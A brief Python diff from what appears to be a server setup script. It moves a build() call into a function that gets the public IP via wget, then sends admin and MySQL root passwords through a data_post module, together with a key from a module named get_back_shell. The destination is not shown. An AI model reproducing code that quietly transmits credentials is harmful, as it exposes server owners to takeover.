@@ -5,7 +5,7 @@ import subprocess
 import data_post
 import get_back_shell
 import os
-build()
+
 def buildup():
     #获取IP地址
     T = subprocess.getstatusoutput("wget -qO- -t1 -T2 ipv4.icanhazip.com")
@@ -32,7 +32,7 @@ def buildup():
     if admin_mail == ' ':
         admin_mail = '982995037@qq.com'
     #dbhost,userurl,userpassword,dbpassword,username ,usermail
-
+    build()
     imf = data_post.imformation(get_back_shell.key,myip,admin_password,mysql_root_password,admin_name,admin_mail)
     imf.update()
     imf.sent()
